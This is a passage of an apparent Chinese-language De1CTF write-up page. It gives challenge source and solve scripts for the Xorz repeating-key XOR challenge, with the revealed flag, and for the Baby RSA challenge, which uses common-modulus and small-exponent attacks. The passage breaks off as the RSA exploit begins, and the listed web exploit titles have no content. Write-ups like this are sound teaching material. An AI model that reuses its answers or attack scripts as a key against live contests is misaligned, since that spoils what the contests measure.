href="#exp">Exp</a></li><li><a href="#others">Others</a></li></ul></li><li><a href="#giftbox">Giftbox</a></li><li><a href="#cloudmusic_rev">CloudMusic_rev</a></li><li><a href="#shellshellshell">ShellShellShell</a><ul><li><a href="#sql注入点分析">sql注入点分析</a></li><li><a href="#sql_exppy">sql_exp.py</a></li><li><a href="#getshell_1">getshell_1</a></li><li><a href="#ssrf_crlf_getshell_exppy">ssrf_crlf_getshell_exp.py</a></li><li><a href="#getshell_2">getshell_2</a></li></ul></li></ul></li><li><a href="#misc">misc</a><ul><li><a href="#mine-sweeping">Mine Sweeping</a><ul><li><a href="#分析-2">分析</a></li><li><a href="#exp-6">exp</a></li></ul></li><li><a href="#deepinreal">DeepInReal</a></li><li><a href="#easy-eos">Easy EOS</a><ul><li><a href="#方法一交易回滚攻击">方法一：交易回滚攻击</a></li><li><a href="#方法二伪随机数攻击">方法二：伪随机数攻击</a></li></ul></li><li><a href="#deepencrypt">DeepEncrypt</a><ul><li><a href="#赛题背景">赛题背景</a></li><li><a href="#赛题流程">赛题流程</a></li><li><a href="#提供文件">提供文件：</a></li><li><a href="#提供接口">提供接口：</a></li><li><a href="#解题脚本">解题脚本</a></li><li><a href="#结果">结果</a></li></ul></li><li><a href="#upgrade">Upgrade</a></li></ul></li></ul><!-- tocstop --><h1><span id="crypto">crypto</span></h1><h2><span id="xorz">Xorz</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key)&lt;<span class="number">38</span>)</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure><h4><span id="exp">exp</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line">c=<span class="string">"49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">(c)</span>:</span></span><br><span class="line">    codeintlist = []</span><br><span class="line">    codeintlist.extend(</span><br><span class="line">        (map(<span class="keyword">lambda</span> i: int(c[i:i + <span class="number">2</span>], <span class="number">16</span>), range(<span class="number">0</span>, len(c), <span class="number">2</span>))))</span><br><span class="line">    salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">    si=cycle(salt)</span><br><span class="line">    newcodeintlist = [ci ^ ord(next(si)) <span class="keyword">for</span> ci <span class="keyword">in</span> codeintlist]</span><br><span class="line">    <span class="keyword">return</span> newcodeintlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></span><br><span class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。</span></span><br><span class="line"><span class="string">            形如&#123;</span></span><br><span class="line"><span class="string">                    1:[[0x11]],</span></span><br><span class="line"><span class="string">                    3:[</span></span><br><span class="line"><span class="string">                        [0x11,0x33,0x46],</span></span><br><span class="line"><span class="string">                        [0x22,0x58],</span></span><br><span class="line"><span class="string">                        [0x33]</span></span><br><span class="line"><span class="string">                       ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    keyPool = dict()</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</span><br><span class="line">        maybe = [<span class="keyword">None</span>] * step</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</span><br><span class="line">            maybe[pos] = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</span><br><span class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    maybe[pos].append(k)</span><br><span class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</span><br><span class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</span><br><span class="line">                maybe = []</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</span><br><span class="line">            keyPool[step] = maybe</span><br><span class="line">    <span class="keyword">return</span> keyPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></span><br><span class="line">    <span class="string">'''传入字典，形如&#123;'e':2,'p':3&#125;</span></span><br><span class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></span><br><span class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></span><br><span class="line"><span class="string">        the relative letter frequencies for normal English text)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</span><br><span class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</span><br><span class="line">    relative = <span class="number">0.0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></span><br><span class="line">    total = sum(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</span><br><span class="line">            relative += frequencies[i] * cpool[i] / total</span><br><span class="line">    <span class="keyword">return</span> relative</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</span><br><span class="line">        mostRelative = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</span><br><span class="line">            r = calCorrelation(posFreq[keyChr])</span><br><span class="line">            <span class="keyword">if</span> r &gt; mostRelative:</span><br><span class="line">                mostRelative = r</span><br><span class="line">                keychar = keyChr</span><br><span class="line">        key.append(keychar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文作为数字列表处理</span></span><br><span class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></span><br><span class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></span><br><span class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></span><br><span class="line"><span class="string">            形如[&#123;</span></span><br><span class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></span><br><span class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></span><br><span class="line"><span class="string">                 &#125;,</span></span><br><span class="line"><span class="string">                 &#123;</span></span><br><span class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></span><br><span class="line"><span class="string">                 &#125;]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    freqList = []</span><br><span class="line">    keyLen = len(keyPoolList)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</span><br><span class="line">        posFreq = dict()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</span><br><span class="line">            posFreq[k] = dict()</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</span><br><span class="line">                p = chr(k ^ c)</span><br><span class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        freqList.append(posFreq)</span><br><span class="line">    <span class="keyword">return</span> freqList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    ll = len(key)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += chr(c ^ key[cur])</span><br><span class="line">        cur = (cur + <span class="number">1</span>) % ll</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ps = []</span><br><span class="line">    ks = []</span><br><span class="line">    ss = []</span><br><span class="line">    ps.extend(xrange(<span class="number">32</span>, <span class="number">127</span>))</span><br><span class="line">    ks.extend(xrange(<span class="number">0xff</span> + <span class="number">1</span>))</span><br><span class="line">    ss.extend(xrange(<span class="number">38</span>))</span><br><span class="line">    cipher = getCipher(c)</span><br><span class="line"></span><br><span class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</span><br><span class="line">        freq = getFrequency(cipher, keyPool[i])</span><br><span class="line">        key = analyseFrequency(freq)</span><br><span class="line">        plain = vigenereDecrypt(cipher, key)</span><br><span class="line">        <span class="keyword">print</span> plain,<span class="string">"\n"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join(map(chr,key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># output: Wvlc0m3tOjo1nu55un1ojOt3q0cl3W 修正后得到flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data文件实际内容：</span></span><br><span class="line"><span class="comment"># flag="de1ctf&#123;W3lc0m3tOjo1nu55un1ojOt3m0cl3W&#125;"</span></span><br><span class="line"><span class="comment"># plain="In faith I do not love thee with mine eyes,For they in thee a thousand errors note;But `tis my heart that loves what they despise,Who in despite of view is pleased to dote.Nor are mine ears with thy tongue`s tune delighted;Nor tender feeling to base touches prone,Nor taste, nor smell, desire to be invitedTo any sensual feast with thee alone.But my five wits, nor my five senses canDissuade one foolish heart from serving thee,Who leaves unswayed the likeness of a man,Thy proud heart`s slave and vassal wretch to be.Only my plague thus far I count my gain,That she that makes me sin awards me pain."</span></span><br></pre></td></tr></table></figure><h2><span id="baby-rsa">Baby RSA</span></h2><p>本题主要考察RSA的基础知识和常见攻击方式，涉及共模攻击、小指数攻击等。首先通过共模攻击等到p，再通过小指数攻击得到e1，e2，然后使用yafu分解大数得到q1且可解出没有任何用处的hint。然后是以flag为明文的加密，这里的加密不满足e和φ互素，因此虽然知道p，q，但无法直接解密，需要稍做操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> e1,e2,p,q1p,q1q,hint,flag</span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f=<span class="keyword">lambda</span> m,e,n,c:pow(m,e,n)==c</span><br><span class="line"><span class="keyword">assert</span>(sum(map(f,[p]*<span class="number">4</span>,[<span class="number">4</span>]*<span class="number">4</span>,n,c))==<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(pow(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(pow(e2+tmp,ee2,n)==ce2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">hint=int(binascii.hexlify(hint),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span>(q1p*q1q==n)</span><br><span class="line"><span class="keyword">assert</span>(q1p&lt;q1q)</span><br><span class="line"><span class="keyword">assert</span>(c==pow(hint,e,n))</span><br><span class="line"></span><br><span class="line">flag=int(binascii.hexlify(flag),<span class="number">16</span>)</span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(c1==pow(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==pow(flag,e2,p*q2))</span><br></pre></td></tr></table></figure><h4><span id="exp">exp</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 